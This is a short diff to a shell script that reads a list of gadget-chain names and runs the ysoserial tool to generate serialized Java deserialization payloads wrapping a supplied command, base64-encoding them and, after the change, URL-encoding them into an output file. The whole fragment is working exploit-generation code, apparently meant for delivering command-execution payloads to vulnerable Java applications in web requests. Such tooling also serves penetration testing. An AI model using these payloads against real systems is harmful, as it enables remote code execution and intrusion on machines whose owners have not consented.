@@ -16,7 +16,7 @@ payload_file="$(pwd)/payloads.txt"
 while read -r payload; do
   output="$(java11 -jar ysoserial-all.jar $payload "$command" | base64 -w 0)"
   if [ -n "$output" ]; then
-  	echo "$output" >> serialized_payloads
+  	echo $(php -r "echo urlencode('$output');") >> serialized_payloads
   fi
   output=""
 done <$payload_file
